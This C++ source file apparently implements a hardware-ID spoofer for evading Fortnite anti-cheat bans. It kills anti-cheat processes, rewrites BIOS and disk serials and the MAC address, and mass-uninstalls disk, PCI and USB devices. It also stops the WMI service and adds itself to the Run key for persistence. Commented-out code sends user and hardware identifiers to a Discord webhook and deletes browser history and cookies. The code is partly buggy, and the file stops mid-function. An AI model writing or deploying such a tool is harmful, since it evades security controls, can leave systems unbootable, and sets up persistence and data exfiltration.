/*

HI, I LEFT SOME // FOR YOU TO KNOW WHAT THE CODE DOES.

made by aci25


*/


#include <iostream>
#include <string>
#include <windows.h>
#include <time.h>
#include <sstream>
#include <C:\Users\ac\source\repos\New folder\TheBigBoy\curl/curl.h>
#define UNLEN 256
// This function will retrieve the username of the PC
/*std::string GetUserName()
{
	char username[UNLEN + 1];
	DWORD username_len = UNLEN + 1;
	GetUserName(username, &username_len);
	return std::string(username);
}

// This function will retrieve the disk serial
std::string GetDiskSerial()
{
	DWORD serial_num;
	std::string serial;
	GetVolumeInformation(".\\", NULL, 0, &serial_num, NULL, NULL, NULL, 0);
	serial = std::to_string(serial_num);
	return serial;
}

// This function will retrieve the baseboard serial
std::string GetBaseboardSerial()
{
	std::string serial;
	HKEY hkey;
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\BIOS", 0, KEY_READ, &hkey) == ERROR_SUCCESS)
	{
		DWORD size;
		if (RegQueryValueEx(hkey, "BaseBoardSerialNumber", NULL, NULL, NULL, &size) == ERROR_SUCCESS)
		{
			char* data = new char[size];
			if (RegQueryValueEx(hkey, "BaseBoardSerialNumber", NULL, NULL, (LPBYTE)data, &size) == ERROR_SUCCESS)
			{
				serial = data;
			}
			delete[] data;
		}
		RegCloseKey(hkey);
	}
	return serial;
}

// This function will retrieve the IP address
std::string GetIPAddress()
{
	std::string ip;
	char hostname[128];
	if (gethostname(hostname, sizeof(hostname)) == 0)
	{
		struct hostent* host = gethostbyname(hostname);
		if (host != nullptr)
		{
			ip = inet_ntoa(*(struct in_addr*)host->h_addr_list[0]);
		}
	}
	return ip;
}

// This function will post the collected data to the discord webhook
void PostToDiscord(const std::string& username, const std::string& disk_serial, const std::string& baseboard_serial, const std::string& ip_address)
{
	CURL* curl;
	CURLcode res;

	// Discord webhook URL
	std::string webhook_url = "your webhook";

	// Create a string stream to construct the body of the request
	std::ostringstream request_body_stream;
	request_body_stream << "{" << std::endl;
	request_body_stream << "    \"username\": \"" << username << "\"," << std::endl;
	request_body_stream << "    \"disk_serial\": \"" << disk_serial << "\"," << std::endl;
	request_body_stream << "    \"baseboard_serial\": \"" << baseboard_serial << "\"," << std::endl;
	request_body_stream << "    \"ip_address\": \"" << ip_address << "\"" << std::endl;
	request_body_stream << "}" << std::endl;

	// Convert the string stream to a string
	std::string request_body = request_body_stream.str();

	curl_global_init(CURL_GLOBAL_ALL);
	curl = curl_easy_init();

	// Set the URL
	curl_easy_setopt(curl, CURLOPT_URL, webhook_url.c_str());

	// Set the request body
	curl_easy_setopt(curl, CURLOPT_POSTFIELDS, request_body.c_str());

	// Set the request type to POST
	curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "POST");

	// Perform the request
	res = curl_easy_perform(curl);

	// Cleanup
	curl_easy_cleanup(curl);
	curl_global_cleanup();
}*/


using namespace std;

BOOL SetVolumeInformation(LPCSTR lpRootPathName, LPCSTR lpVolumeName, DWORD dwVolumeSerialNumber, DWORD dwMaximumComponentLength)
{
	BOOL bResult;
	DWORD dwFileSystemFlags;
	CHAR szFileSystemName[MAX_PATH];

	bResult = GetVolumeInformation(lpRootPathName, NULL, 0, NULL, NULL, &dwFileSystemFlags, szFileSystemName, MAX_PATH);

	if (bResult)
	{
		bResult = SetVolumeInformation(lpRootPathName, lpVolumeName, dwVolumeSerialNumber, dwMaximumComponentLength);
	}

	return bResult;
}

BOOL SetVolumeID(LPCSTR lpRootPathName, DWORD VolumeID)
{
	BOOL bResult = FALSE;
	DWORD dwDataSize;
	DWORD dwSerialNumber;
	CHAR szVolumeName[MAX_PATH];
	CHAR szFileSystemName[MAX_PATH];
	DWORD dwMaxComponentLen;
	DWORD dwFileSystemFlags;

	dwDataSize = GetVolumeInformation(lpRootPathName, szVolumeName, MAX_PATH, &dwSerialNumber, &dwMaxComponentLen, &dwFileSystemFlags, szFileSystemName, MAX_PATH);


	if (dwSerialNumber != VolumeID)
	{
		bResult = SetVolumeInformation(lpRootPathName, szVolumeName, VolumeID, NULL);
	}

	return bResult;
}
#include <filesystem>
#include <stdio.h>
#include <tchar.h>
#include <IPHlpApi.h>
#include <stdlib.h>
#include <iptypes.h>
#pragma comment(lib, "IPHlpApi.lib")
#include <algorithm>
#include <random>

std::string GenerateMACAddress()
{
	std::string macAddress;
	const char* charset = "ABCDEF0123456789";
	const char* charset2 = "26AE";

	for (int i = 0; i < 12; i++)
	{
		if (i == 2)
		{
			int randomChar = rand() % 4;
			macAddress += charset2[randomChar];
		}
		else
		{
			int randomChar = rand() % 16;
			macAddress += charset[randomChar];
		}
	}

	return macAddress;
}

BOOL SetMACAddress(std::string macAddress)
{
	HKEY hKey;
	LONG regResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SYSTEM\\CurrentControlSet\\Control\\Class\\{4D36E972-E325-11CE-BFC1-08002bE10318}"), 0, KEY_ALL_ACCESS, &hKey);

	if (regResult != ERROR_SUCCESS)
	{
		return FALSE;
	}

	for (int i = 0; i < 3; i++)
	{
		std::string subkeyName = std::to_string(i) + "000";
		HKEY hSubKey;
		regResult = RegOpenKeyEx(hKey, TEXT(subkeyName.c_str()), 0, KEY_ALL_ACCESS, &hSubKey);

		if (regResult != ERROR_SUCCESS)
		{
			RegCloseKey(hKey);
			return FALSE;
		}

		regResult = RegSetValueEx(hSubKey, TEXT("NetworkAddress"), 0, REG_SZ, (LPBYTE)macAddress.c_str(), macAddress.size());

		if (regResult != ERROR_SUCCESS)
		{
			RegCloseKey(hSubKey);
			RegCloseKey(hKey);
			return FALSE;
		}

		DWORD powerSavingMode = 24;
		regResult = RegSetValueEx(hSubKey, TEXT("PnPCapabilities"), 0, REG_DWORD, (LPBYTE)&powerSavingMode, sizeof(DWORD));

		if (regResult != ERROR_SUCCESS)
		{
			RegCloseKey(hSubKey);
			RegCloseKey(hKey);
			return FALSE;
		}

		RegCloseKey(hSubKey);
	}

	RegCloseKey(hKey);

	return TRUE;
}

BOOL ResetNetworkAdapters()
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	
	std::string commandStr = "netsh interface set interface name=\"%s\" disable";
	CreateProcess(NULL, (LPSTR)commandStr.c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

	
	WaitForSingleObject(pi.hProcess, INFINITE);

	
	commandStr = "netsh interface set interface name=\"%s\" enable";
	CreateProcess(NULL, (LPSTR)commandStr.c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

	
	WaitForSingleObject(pi.hProcess, INFINITE);

	return TRUE;
}

/*void generateMacAddress(BYTE* macAddress)
{
	for (int i = 0; i < 6; i++)
		macAddress[i] = (BYTE)(rand() % 256);
}

void changeMacAddress(const char* adapterName, BYTE* macAddress)
{
	IP_ADAPTER_ADDRESSES* addresses = NULL;
	ULONG addressesLength = 0;

	
	if (GetAdaptersAddresses(AF_UNSPEC, 0, NULL, addresses, &addressesLength) == ERROR_BUFFER_OVERFLOW)
	{
		addresses = (IP_ADAPTER_ADDRESSES*)malloc(addressesLength);
		if (GetAdaptersAddresses(AF_UNSPEC, 0, NULL, addresses, &addressesLength) == NO_ERROR)
		{
			
			for (IP_ADAPTER_ADDRESSES* address = addresses; address != NULL; address = address->Next)
			{
				
				if (strcmp(address->AdapterName, adapterName) == 0)
				{
					ULONG status = SetAdapterIpAddress(address->Luid, macAddress);
					if (status != NO_ERROR)
						cout << "Failed to change MAC address: " << status << endl;

					break;
				}
			}
		}

		free(addresses);
	}
}

void resetAdapter(const char* adapterName)
{
	
	TCHAR adapterNameTChar[256];
	int adapterNameLength = MultiByteToWideChar(CP_UTF8, 0, adapterName, -1, adapterNameTChar, 256);

	
	ULONG status = ResetAdapterIpAddress(adapterNameTChar);
	if (status != NO_ERROR)
		cout << "Failed to reset adapter: " << status << endl;
}*/

#include <iostream>
#include <Windows.h>
#include <Shlobj.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <WinUser.h>
#define eneb 0xE3 
#define abere 0xE4 
void nere(LPVOID lpBaseAddress, DWORD dwSize)
{
	for (DWORD i = 0; i < dwSize; i++)
	{
		*(BYTE*)((DWORD)lpBaseAddress + i) = abere;
	}
}
void ere(LPVOID lpBaseAddress, DWORD dwSize)
{
	for (DWORD i = 0; i < dwSize; i++)
	{
		*(BYTE*)((DWORD)lpBaseAddress + i) = eneb;
	}
}
int main()
{
	// Get the screen resolution
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);

	// Create a window
	HWND hwnd = CreateWindowEx(WS_EX_TOPMOST,
		"static",
		"Totoware",
		WS_POPUP | WS_VISIBLE | WS_MAXIMIZE,
		0, 0,
		screenWidth, screenHeight,
		NULL, NULL, NULL, NULL);

	// Set the window to fullscreen
	ShowWindow(hwnd, SW_SHOWMAXIMIZED);

	// Disable user input
	EnableWindow(hwnd, false);

	// Set the background color to black
	SetClassLong(hwnd, GCL_HBRBACKGROUND, (LONG)CreateSolidBrush(RGB(0, 0, 0)));

	// Hide the cursor
	ShowCursor(false);

	// Get the size of the text
	HDC hdc = GetDC(hwnd);
	HFONT hFont = CreateFont(50, 0, 0, 0, FW_DONTCARE, FALSE, FALSE, FALSE, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_SWISS, "Arial");
	SelectObject(hdc, hFont);
	SIZE size;
	GetTextExtentPoint32(hdc, "Totoware", 8, &size);

	// Calculate the position of the text
	int x = screenWidth / 2 - size.cx / 2;
	int y = screenHeight / 2 - size.cy / 2;

	// Draw the text
	TextOut(hdc, x, y, "Totoware", 8);

	// Draw the loading animation
	int loadingX = screenWidth / 2 - 30;
	int loadingY = screenHeight / 2 + size.cy;
	HFONT loadingFont = CreateFont(20, 0, 0, 0, FW_DONTCARE, FALSE, FALSE, FALSE, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_SWISS, "Arial");
	SelectObject(hdc, loadingFont);
	TextOut(hdc, loadingX, loadingY, "Loading", 7);

	// Fade the text away
	for (float alpha = 1.0f; alpha > 0.0f; alpha -= 0.01f)
	{
		SetLayeredWindowAttributes(hwnd, RGB(0, 0, 0), (int)(255.0f * alpha), LWA_ALPHA);
		Sleep(50);
	}

	// Close the window
	DestroyWindow(hwnd);
	/*	std::string username = GetUserName();
		std::string disk_serial = GetDiskSerial();
		std::string baseboard_serial = GetBaseboardSerial();
		std::string ip_address = GetIPAddress();

		// Post the data to the discord webhook
		PostToDiscord(username, disk_serial, baseboard_serial, ip_address);*/
	LPVOID lpBaseAddress = (LPVOID)GetModuleHandle(NULL);

	DWORD dwSize = GetModuleFileName(NULL, NULL, 0);

	nere(lpBaseAddress, dwSize);

	ere(lpBaseAddress, dwSize);
	srand(time(NULL));

	const char* processNames[] = {
		"FortniteClient-Win64-Shipping.exe",
		"EasyAntiCheat.exe",
		"BattlEye.exe",
		"EpicGamesLauncher.exe",
	};

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE)
	{
		cerr << "Failed to get the process snapshot!" << endl;
		return 1;
	}


	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(pe32);
	if (Process32First(hSnapshot, &pe32))
	{
		do
		{

			for (int i = 0; i < sizeof(processNames) / sizeof(processNames[0]); i++)
			{
				if (_tcscmp(pe32.szExeFile, processNames[i]) == 0)
				{

					HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
					if (hProcess == NULL)
					{
						cerr << "Failed to open process!" << endl;
						CloseHandle(hSnapshot);
						return 1;
					}
					TerminateProcess(hProcess, 0);
					CloseHandle(hProcess);
				}
			}
		} while (Process32Next(hSnapshot, &pe32));
	}

	// Clean up
	//BYTE macAddress[6];
	//generateMacAddress(macAddress);

//	const char* adapterName = "Ethernet";
	//changeMacAddress(adapterName, macAddress);

//	resetAdapter(adapterName);
	string parameters = "/bs ";
	for (int i = 0; i < 15; i++) {
		parameters += to_string(rand() % 10);
	}

	const char* command = ("amidewinx64.exe /su auto " + parameters).c_str();
	system(command);

	DWORD dwBytesReturned;
	char szVolumeName[MAX_PATH + 1] = { 0 };
	char szVolumeSerialNumber[MAX_PATH + 1] = { 0 };
	GetVolumeInformationA("C:\\", szVolumeName, MAX_PATH, (DWORD*)szVolumeSerialNumber, NULL, NULL, NULL, 0);
	DWORD dwSerialNumber = atoi(szVolumeSerialNumber);
	dwSerialNumber++;
	wsprintfA(szVolumeSerialNumber, "%u", dwSerialNumber);
	DeviceIoControl(CreateFileA("\\\\.\\C:", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL), NULL, szVolumeSerialNumber, MAX_PATH, NULL, 0, &dwBytesReturned, NULL);

	HKEY hKey;
	if (RegOpenKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS)
	{
		string programPath = filesystem::current_path().string() + "\\thebigboy.exe";
		RegSetValueEx(hKey, "thebigboy", 0, REG_SZ, (BYTE*)programPath.c_str(), programPath.length() + 1);
		RegCloseKey(hKey);
	}
	string yourpath = "YOURPATH";
	string driverless_assets = yourpath + "\\driverless\\assets";
	string devManView = driverless_assets + "\\DevManView.exe";
	string amidewin = driverless_assets + "\\AMIDEWIN.EXE";
	string amidewinx64 = driverless_assets + "\\AMIDEWINx64.EXE";
	string devicecleanupCmd = driverless_assets + "\\DeviceCleanupCmd.exe";
	string cleanhdd = driverless_assets + "\\CleanHDD.exe";
	string volumeid64 = driverless_assets + "\\volumeid64.exe";

	SetCurrentDirectory(driverless_assets.c_str());

	string cmd1 = devManView + " /uninstall \"PCI\\VEN*\" /use_wildcard";
	ShellExecute(NULL, NULL, devManView.c_str(), cmd1.c_str(), NULL, 0);

	cout << "Spoofing mobo" << endl;

	string cmd2 = amidewin + " /BS " + to_string(rand()) + "mafia-BS" + to_string(rand());
	ShellExecute(NULL, NULL, amidewin.c_str(), cmd2.c_str(), NULL, 0);



	string cmd3 = amidewin + " /SS " + to_string(rand()) + "mafia-SS" + to_string(rand());
	ShellExecute(NULL, NULL, amidewin.c_str(), cmd3.c_str(), NULL, 0);



	string cmd4 = amidewin + " /SV " + to_string(rand()) + "mafia-SV" + to_string(rand());
	ShellExecute(NULL, NULL, amidewin.c_str(), cmd4.c_str(), NULL, 0);



	string cmd5 = amidewin + " /SU AUTO";
	ShellExecute(NULL, NULL, amidewin.c_str(), cmd5.c_str(), NULL, 0);



	string cmd6 = amidewin + " /SK " + to_string(rand()) + "mafia-SK" + to_string(rand());
	ShellExecute(NULL, NULL, amidewin.c_str(), cmd6.c_str(), NULL, 0);



	string cmd7 = amidewin + " /BM " + to_string(rand()) + "mafia-BM" + to_string(rand());
	ShellExecute(NULL, NULL, amidewin.c_str(), cmd7.c_str(), NULL, 0);



	string cmd8 = amidewin + " /BV " + to_string(rand()) + "mafia-BV" + to_string(rand());
	ShellExecute(NULL, NULL, amidewin.c_str(), cmd8.c_str(), NULL, 0);



	string cmd9 = amidewinx64 + " /BS " + to_string(rand()) + "mafia-BS" + to_string(rand());
	ShellExecute(NULL, NULL, amidewinx64.c_str(), cmd9.c_str(), NULL, 0);



	string cmd10 = amidewinx64 + " /SS " + to_string(rand()) + "mafia-SS" + to_string(rand());
	ShellExecute(NULL, NULL, amidewinx64.c_str(), cmd10.c_str(), NULL, 0);

	//PING localhost -n 3 >NUL


	//START "" /B "%~dp0AMIDEWINx64.EXE" /SV %RANDOM%mafia-SV%RANDOM%
	string cmd11 = amidewinx64 + " /SV " + to_string(rand()) + "mafia-SV" + to_string(rand());
	ShellExecute(NULL, NULL, amidewinx64.c_str(), cmd11.c_str(), NULL, 0);

	//PING localhost -n 3 >NUL


	//START "" /B "%~dp0AMIDEWINx64.EXE" /SU AUTO
	string cmd12 = amidewinx64 + " /SU AUTO";
	ShellExecute(NULL, NULL, amidewinx64.c_str(), cmd12.c_str(), NULL, 0);

	//PING localhost -n 3 >NUL


	//START "" /B "%~dp0AMIDEWINx64.EXE" /SK %RANDOM%mafia-SK%RANDOM%
	string cmd13 = amidewinx64 + " /SK " + to_string(rand()) + "mafia-SK" + to_string(rand());
	ShellExecute(NULL, NULL, amidewinx64.c_str(), cmd13.c_str(), NULL, 0);

	//PING localhost -n 3 >NUL


	//START "" /B "%~dp0AMIDEWINx64.EXE" /BM %RANDOM%mafia-BM%RANDOM%
	string cmd14 = amidewinx64 + " /BM " + to_string(rand()) + "mafia-BM" + to_string(rand());
	ShellExecute(NULL, NULL, amidewinx64.c_str(), cmd14.c_str(), NULL, 0);

	//PING localhost -n 3 >NUL


	//START "" /B "%~dp0AMIDEWINx64.EXE" /BV %RANDOM%mafia-BV%RANDOM%
	string cmd15 = amidewinx64 + " /BV " + to_string(rand()) + "mafia-BV" + to_string(rand());
	ShellExecute(NULL, NULL, amidewinx64.c_str(), cmd15.c_str(), NULL, 0);

	//PING localhost -n 5 >NUL


	//start "" /min  ""DevManView.exe /uninstall "WAN Miniport*" /use_wildcard""
	string cmd16 = devManView + " /uninstall \"WAN Miniport*\" /use_wildcard";
	ShellExecute(NULL, NULL, devManView.c_str(), cmd16.c_str(), NULL, 0);

	//start "" /min  ""DevManView.exe /uninstall "Disk drive*" /use_wildcard""
	string cmd17 = devManView + " /uninstall \"Disk drive*\" /use_wildcard";
	ShellExecute(NULL, NULL, devManView.c_str(), cmd17.c_str(), NULL, 0);

	//start "" /min  ""DevManView.exe /uninstall "C:\"
	string cmd18 = devManView + " /uninstall \"C:\\\"";
	ShellExecute(NULL, NULL, devManView.c_str(), cmd18.c_str(), NULL, 0);

	//start "" /min  ""DevManView.exe /uninstall "D:\"
	string cmd19 = devManView + " /uninstall \"D:\\\"";
	ShellExecute(NULL, NULL, devManView.c_str(), cmd19.c_str(), NULL, 0);

	//start "" /min  ""DevManView.exe /uninstall "E:\"
	string cmd20 = devManView + " /uninstall \"E:\\\"";
	ShellExecute(NULL, NULL, devManView.c_str(), cmd20.c_str(), NULL, 0);

	//start "" /min  ""DevManView.exe /uninstall "F:\"
	string cmd21 = devManView + " /uninstall \"F:\\\"";
	ShellExecute(NULL, NULL, devManView.c_str(), cmd21.c_str(), NULL, 0);

	//start "" /min  ""DevManView.exe /uninstall "G:\"
	string cmd22 = devManView + " /uninstall \"G:\\\"";
	ShellExecute(NULL, NULL, devManView.c_str(), cmd22.c_str(), NULL, 0);

	//start "" /min  ""DevManView.exe /uninstall "Disk"
	string cmd23 = devManView + " /uninstall \"Disk\"";
	ShellExecute(NULL, NULL, devManView.c_str(), cmd23.c_str(), NULL, 0);

	//start "" /min  ""DevManView.exe /uninstall "disk"
	string cmd24 = devManView + " /uninstall \"disk\"";
	ShellExecute(NULL, NULL, devManView.c_str(), cmd24.c_str(), NULL, 0);

	//start "" /min  ""DevManView.exe /uninstall "Disk&*" /use_wildcard""
	string cmd25 = devManView + " /uninstall \"Disk&*\" /use_wildcard";
	ShellExecute(NULL, NULL, devManView.c_str(), cmd25.c_str(), NULL, 0);

	//start "" /min  ""DevManView.exe /uninstall "SWD\WPDBUSENUM*" /use_wildcard""
	string cmd26 = "start \"\" /min \"\"DevManView.exe /uninstall \"SWD\\WPDBUSENUM*\" /use_wildcard\"\"";
	system(cmd26.c_str());


	//start "" /min  ""DevManView.exe /uninstall "USBSTOR*" /use_wildcard""
	string cmd27 = "start \"\" /min \"\"DevManView.exe /uninstall \"USBSTOR*\" /use_wildcard\"\"";
	system(cmd27.c_str());


	//start "" /min  ""DevManView.exe /uninstall "SCSI\Disk*" /use_wildcard""
	string cmd28 = "start \"\" /min \"\"DevManView.exe /uninstall \"SCSI\\Disk*\" /use_wildcard\"\"";
	system(cmd28.c_str());


	//start "" /min  ""DevManView.exe /uninstall "STORAGE*" /use_wildcard""
	string cmd29 = "start \"\" /min \"\"DevManView.exe /uninstall \"STORAGE*\" /use_wildcard\"\"";
	system(cmd29.c_str());


	//start "" /min  ""DevManView.exe /uninstall "WAN Miniport*" /use_wildcard""
	string cmd30 = "start \"\" /min \"\"DevManView.exe /uninstall \"WAN Miniport*\" /use_wildcard\"\"";
	system(cmd30.c_str());


	//start "" /min  ""DevManView.exe /uninstall "Disk"
	string cmd31 = "start \"\" /min \"\"DevManView.exe /uninstall \"Disk\"\"";
	system(cmd31.c_str());


	//start "" /min  ""DevManView.exe /uninstall "disk"
	string cmd32 = "start \"\" /min \"\"DevManView.exe /uninstall \"disk\"\"";
	system(cmd32.c_str());


	//start "" /min  ""DevManView.exe /uninstall "Disk&*" /use_wildcard""
	string cmd33 = "start \"\" /min \"\"DevManView.exe /uninstall \"Disk&*\" /use_wildcard\"\"";
	system(cmd33.c_str());


	//start "" /min  ""DevManView.exe /uninstall "C:\"
	string cmd34 = "start \"\" /min \"\"DevManView.exe /uninstall \"C:\\\"";
	system(cmd34.c_str());


	//start "" /min  ""DevManView.exe /uninstall "D:\"
	string cmd35 = "start \"\" /min \"\"DevManView.exe /uninstall \"D:\\\"";
	system(cmd35.c_str());


	//start "" /min  ""DevManView.exe /uninstall "E:\"
	string cmd36 = "start \"\" /min \"\"DevManView.exe /uninstall \"E:\\\"";
	system(cmd36.c_str());


	//start "" /min  ""DevManView.exe /uninstall "F:\"
	string cmd37 = "start \"\" /min \"\"DevManView.exe /uninstall \"F:\\\"";
	system(cmd37.c_str());


	//start "" /min  ""DevManView.exe /uninstall "G:\"
	string cmd38 = "start \"\" /min \"\"DevManView.exe /uninstall \"G:\\\"";
	system(cmd38.c_str());


	//start "" /min  ""DevManView.exe /uninstall "PCI\VEN*" /use_wildcard""
	string cmd39 = "start \"\" /min \"\"DevManView.exe /uninstall \"PCI\\VEN*\" /use_wildcard\"\"";
	system(cmd39.c_str());


	//start "" /min  ""DeviceCleanupCmd.exe" * -s""
	string cmd40 = "start \"\" /min \"\"DeviceCleanupCmd.exe\" * -s\"\"";
	system(cmd40.c_str());


	//START "" /B "%~dp0volumeid64.exe" c: %rand1%-%rand2% /accepteula
	int rand1 = (rand() * 8998 / 32768) + 1000;
	int rand2 = (rand() * 8998 / 32768) + 1000;
	string cmd41 = "start \"\" /b /wait \"%~dp0volumeid64.exe\" c: " + to_string(rand1) + "-" + to_string(rand2) + " /accepteula";
	system(cmd41.c_str());


	//start "" /min  ""DevManView.exe /uninstall "WAN Miniport*" /use_wildcard""
	string cmd42 = "start \"\" /min \"\"DevManView.exe /uninstall \"WAN Miniport*\" /use_wildcard\"\"";
	system(cmd42.c_str());


	//start "" /min  ""DevManView.exe /uninstall "Disk drive*" /use_wildcard""
	string cmd43 = "start \"\" /min \"\"DevManView.exe /uninstall \"Disk drive*\" /use_wildcard\"\"";
	system(cmd43.c_str());


	//start "" /min  ""DevManView.exe /uninstall "Disk"
	string cmd44 = "start \"\" /min \"\"DevManView.exe /uninstall \"Disk\"\"";
	system(cmd44.c_str());


	//start "" /min  ""DevManView.exe /uninstall "disk"
	string cmd45 = "start \"\" /min \"\"DevManView.exe /uninstall \"disk\"\"";
	system(cmd45.c_str());


	//start "" /min  ""DevManView.exe /uninstall "Disk&*" /use_wildcard""
	string cmd46 = "start \"\" /min \"\"DevManView.exe /uninstall \"Disk&*\" /use_wildcard\"\"";
	system(cmd46.c_str());


	//START "" /B "%~dp0AMIDEWIN.EXE" /BS %RANDOM%mafia-BS%RANDOM%
	string cmd47 = "start \"\" /b \"%~dp0AMIDEWIN.EXE\" /BS %RANDOM%mafia-BS%RANDOM%";
	system(cmd1.c_str());


	//START "" /B "%~dp0AMIDEWIN.EXE" /SS %RANDOM%mafia-SS%RANDOM%
	string cmd48 = "start \"\" /b \"%~dp0AMIDEWIN.EXE\" /SS %RANDOM%mafia-SS%RANDOM%";
	system(cmd2.c_str());


	//START "" /B "%~dp0AMIDEWIN.EXE" /SV %RANDOM%mafia-SV%RANDOM%
	string cmd49 = "start \"\" /b \"%~dp0AMIDEWIN.EXE\" /SV %RANDOM%mafia-SV%RANDOM%";
	system(cmd3.c_str());


	//START "" /B "%~dp0AMIDEWIN.EXE" /SU AUTO
	string cmd50 = "start \"\" /b \"%~dp0AMIDEWIN.EXE\" /SU AUTO";
	system(cmd4.c_str());


	//START "" /B "%~dp0AMIDEWIN.EXE" /SK %RANDOM%mafia-SK%RANDOM%
	string cmd51 = "start \"\" /b \"%~dp0AMIDEWIN.EXE\" /SK %RANDOM%mafia-SK%RANDOM%";
	system(cmd5.c_str());


	//START "" /B "%~dp0AMIDEWIN.EXE" /BM %RANDOM%mafia-BM%RANDOM%
	string cmd52 = "start \"\" /b \"%~dp0AMIDEWIN.EXE\" /BM %RANDOM%mafia-BM%RANDOM%";
	system(cmd6.c_str());


	//START "" /B "%~dp0AMIDEWIN.EXE" /BV %RANDOM%mafia-BV%RANDOM%
	string cmd53 = "start \"\" /b \"%~dp0AMIDEWIN.EXE\" /BV %RANDOM%mafia-BV%RANDOM%";
	system(cmd7.c_str());


	//START "" /B "%~dp0AMIDEWINx64.EXE" /BS %RANDOM%mafia-BS%RANDOM%
	string cmd54 = "start \"\" /b \"%~dp0AMIDEWINx64.EXE\" /BS %RANDOM%mafia-BS%RANDOM%";
	system(cmd8.c_str());


	//START "" /B "%~dp0AMIDEWINx64.EXE" /SS %RANDOM%mafia-SS%RANDOM%
	string cmd55 = "start \"\" /b \"%~dp0AMIDEWINx64.EXE\" /SS %RANDOM%mafia-SS%RANDOM%";
	system(cmd9.c_str());


	//START "" /B "%~dp0AMIDEWINx64.EXE" /SV %RANDOM%mafia-SV%RANDOM%
	string cmd56 = "start \"\" /b \"%~dp0AMIDEWINx64.EXE\" /SV %RANDOM%mafia-SV%RANDOM%";
	system(cmd10.c_str());


	//START "" /B "%~dp0AMIDEWINx64.EXE" /SU AUTO
	string cmd57 = "start \"\" /b \"%~dp0AMIDEWINx64.EXE\" /SU AUTO";
	system(cmd11.c_str());


	//START "" /B "%~dp0AMIDEWINx64.EXE" /SK %RANDOM%mafia-SK%RANDOM%
	string cmd58 = "start \"\" /b \"%~dp0AMIDEWINx64.EXE\" /SK %RANDOM%mafia-SK%RANDOM%";
	system(cmd12.c_str());
	system("net stop winmgmt /y");
	string usernamee;

	char* username_char = getenv("username");
	if (username_char != nullptr) {
		usernamee = username_char;
	}
	// Retrieve the path of the current user's directory
	TCHAR szPath[MAX_PATH];
	SHGetFolderPath(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, szPath);
	string userPath(szPath);

	/*// Look for Fortnite files and folders
	string fortnitePath = userPath + "\\FortniteGame";
	string fortniteLogFile = userPath + "\\FortniteGame\\Saved\\Logs\\Game.log";
	string fortniteCrashFile = userPath + "\\FortniteGame\\Saved\\Logs\\Game_0_0.log";
	string fortniteReplayFile = userPath + "\\FortniteGame\\Saved\\Replays\\Demo";
	string fortniteCfgFile = userPath + "\\FortniteGame\\Saved\\Config\\WindowsClient\\GameUserSettings.ini";
	string fortniteShadersFile = userPath + "\\FortniteGame\\Saved\\Shaders\\Cache";

	// Look for Chrome files and folders
	string chromeCacheFile = userPath + "\\Google\\Chrome\\User Data\\Default\\Cache\\*";
	string chromeHistoryFile = userPath + "\\Google\\Chrome\\User Data\\Default\\History";
	string chromeCookiesFile = userPath + "\\Google\\Chrome\\User Data\\Default\\Cookies";

	// Look for Epic Games files and folders
	string epicGamesPath = userPath + "\\Epic Games";
	string epicGamesCacheFile = userPath + "\\Epic Games\\Cache\\*";
	string epicGamesLogsFile = userPath + "\\Epic Games\\Logs\\*";

	// Look for Windows Temp files and folders
	string windowsTempFile = userPath + "\\Temp\\*";

	// Delete the Fortnite files and folders
	if (DeleteFile(fortniteLogFile.c_str()) == 0)
		cout << "Error deleting log file" << endl;
	if (DeleteFile(fortniteCrashFile.c_str()) == 0)
		cout << "Error deleting crash file" << endl;
	if (RemoveDirectory(fortniteReplayFile.c_str()) == 0)
		cout << "Error deleting replay folder" << endl;
	if (DeleteFile(fortniteCfgFile.c_str()) == 0)
		cout << "Error deleting config file" << endl;
	if (RemoveDirectory(fortniteShadersFile.c_str()) == 0)
		cout << "Error deleting shaders folder" << endl;
	if (RemoveDirectory(fortnitePath.c_str()) == 0)
		cout << "Error deleting FortniteGame folder" << endl;

	// Delete the Chrome files and folders
	if (DeleteFile(chromeCacheFile.c_str()) == 0)
		cout << "Error deleting Chrome cache file" << endl;
	if (DeleteFile(chromeHistoryFile.c_str()) == 0)
		cout << "Error deleting Chrome history file" << endl;
	if (DeleteFile(chromeCookiesFile.c_str()) == 0)
		cout << "Error deleting Chrome cookies file" << endl;

	// Delete the Epic Games files and folders
	if (DeleteFile(epicGamesCacheFile.c_str()) == 0)
		cout << "Error deleting Epic Games cache file" << endl;
	if (DeleteFile(epicGamesLogsFile.c_str()) == 0)
		cout << "Error deleting Epic Games logs file" << endl;
	if (RemoveDirectory(epicGamesPath.c_str()) == 0)
		cout << "Error deleting Epic Games folder" << endl;

	// Delete the Windows Temp files and folders
	if (DeleteFile(windowsTempFile.c_str()) == 0)
		cout << "Error deleting Windows Temp file" << endl;
	string file_path = "C:\\Users\\" + usernamee + "\\AppData\\Local\\FortniteGame\\*.*";
	if (DeleteFile(file_path.c_str()) != 0) {
		cout << "Successfully deleted Fortnite files" << endl;
	}
	else {
		cout << "Failed to delete Fortnite files" << endl;
	}
	string dir_path = "C:\\Users\\" + usernamee + "\\AppData\\Local\\FortniteGame";
